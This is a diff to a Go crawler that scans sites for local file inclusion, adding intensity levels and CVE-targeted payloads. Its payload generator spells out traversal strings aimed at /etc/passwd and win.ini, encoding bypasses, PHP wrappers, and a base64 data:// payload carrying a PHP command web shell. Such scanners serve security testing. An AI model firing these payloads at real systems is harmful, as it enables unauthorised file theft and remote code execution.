@@ -44,6 +44,8 @@ type LFIScanner struct {
 	PageCountMu sync.Mutex
 	MaxDepth    int
 	Payloads    []string
+	Intensity   int
+	TargetedCVEs []string
 	Throttle    time.Duration
 }
 
@@ -53,8 +55,7 @@ type lfiCrawlJob struct {
 	Depth int
 }
 
-// NewLFIScanner creates a new instance of the LFI scanner
-func NewLFIScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*LFIScanner, error) {
+func NewLFIScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*LFIScanner, error) {
 	parsed, err := url.Parse(start)
 	if err != nil {
 		return nil, err
@@ -62,21 +63,25 @@ func NewLFIScanner(start string, workers, maxPages, maxDepth int, throttle time.
 	client := &http.Client{
 		Timeout: 20 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse // Don't follow redirects automatically for LFI fuzzing
+			return http.ErrUseLastResponse
 		},
 	}
 
+	payloads := generateLFIPayloads(intensity, targetedCVEs, customPayloads)
+
 	s := &LFIScanner{
-		StartURL: parsed,
-		Client:   client,
-		Visited:  make(map[string]bool),
-		Queue:    make(chan lfiCrawlJob, 1000),
-		Findings: []FindingLFI{},
-		Workers:  workers,
-		MaxPages: maxPages,
-		MaxDepth: maxDepth,
-		Throttle: throttle,
-		Payloads: generateLFIPayloads(),
+		StartURL:     parsed,
+		Client:       client,
+		Visited:      make(map[string]bool),
+		Queue:        make(chan lfiCrawlJob, 1000),
+		Findings:     []FindingLFI{},
+		Workers:      workers,
+		MaxPages:     maxPages,
+		MaxDepth:     maxDepth,
+		Throttle:     throttle,
+		Payloads:     payloads,
+		Intensity:    intensity,
+		TargetedCVEs: targetedCVEs,
 	}
 	return s, nil
 }
@@ -274,8 +279,17 @@ func (s *LFIScanner) detectLFI(body string) (string, bool) {
 	return "", false
 }
 
-// generateLFIPayloads returns a massive list of LFI payloads
-func generateLFIPayloads() []string {
+// generateLFIPayloads returns a tailored list of LFI payloads based on intensity and CVEs
+func generateLFIPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
+	var payloads []string
+
+	// CVE-specific payloads
+	for _, id := range targetedCVEs {
+		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerLFI {
+			payloads = append(payloads, cve.Payloads...)
+		}
+	}
+
 	basePayloads := []string{
 		"../../../../etc/passwd",
 		"../../../../../../../../etc/passwd",
@@ -283,47 +297,47 @@ func generateLFIPayloads() []string {
 		"../../../../windows/win.ini",
 		"../../../../../../../../windows/win.ini",
 		"C:\\Windows\\win.ini",
-		"php://filter/convert.base64-encode/resource=index.php",
-		"php://filter/convert.base64-encode/resource=config.php",
-		"file:///etc/passwd",
-		"file:///C:/Windows/win.ini",
 	}
 
-	// Null byte injection variants
-	var payloads []string
+	if intensity > 2 {
+		basePayloads = append(basePayloads, []string{
+			"php://filter/convert.base64-encode/resource=index.php",
+			"php://filter/convert.base64-encode/resource=config.php",
+			"file:///etc/passwd",
+			"file:///C:/Windows/win.ini",
+		}...)
+	}
+
+	// Null byte injection variants (Intensity > 3)
 	for _, p := range basePayloads {
 		payloads = append(payloads, p)
-		payloads = append(payloads, p+"%00")
-		payloads = append(payloads, p+"%00.jpg")
-		payloads = append(payloads, p+"%00.html")
+		if intensity > 3 {
+			payloads = append(payloads, p+"%00")
+			payloads = append(payloads, p+"%00.jpg")
+		}
 	}
 
-	// URL Encoding variants
-	// We can add logic here to double encode, etc.
-	// For brevity in this generation, we'll stick to a solid list.
+	if intensity > 3 {
+		// Filter bypasses and more depth
+		payloads = append(payloads,
+			"....//....//....//etc/passwd",
+			"....\\/....\\/....\\/etc/passwd",
+			"..%252f..%252f..%252fetc%252fpasswd",
+			"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+			"expect://id",
+			"input://",
+			"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+		)
+		
+		for i := 10; i <= 20; i++ {
+			dots := strings.Repeat("../", i)
+			payloads = append(payloads, dots+"etc/passwd")
+		}
+	}
 
-	// Filter bypasses
-	payloads = append(payloads,
-		"....//....//....//etc/passwd",
-		"....\\/....\\/....\\/etc/passwd",
-		"..%252f..%252f..%252fetc%252fpasswd",
-		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-	)
-
-	// Wrappers
-	payloads = append(payloads,
-		"expect://id",
-		"input://",
-		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", // <?php system($_GET['cmd']); ?>
-	)
-
-	// Add more depth variations
-	for i := 1; i <= 10; i++ {
-		dots := strings.Repeat("../", i)
-		payloads = append(payloads, dots+"etc/passwd")
-		payloads = append(payloads, dots+"windows/win.ini")
-		payloads = append(payloads, dots+"boot.ini")
+	if len(customPayloads) > 0 {
+		payloads = append(payloads, customPayloads...)
 	}
 
 	return payloads
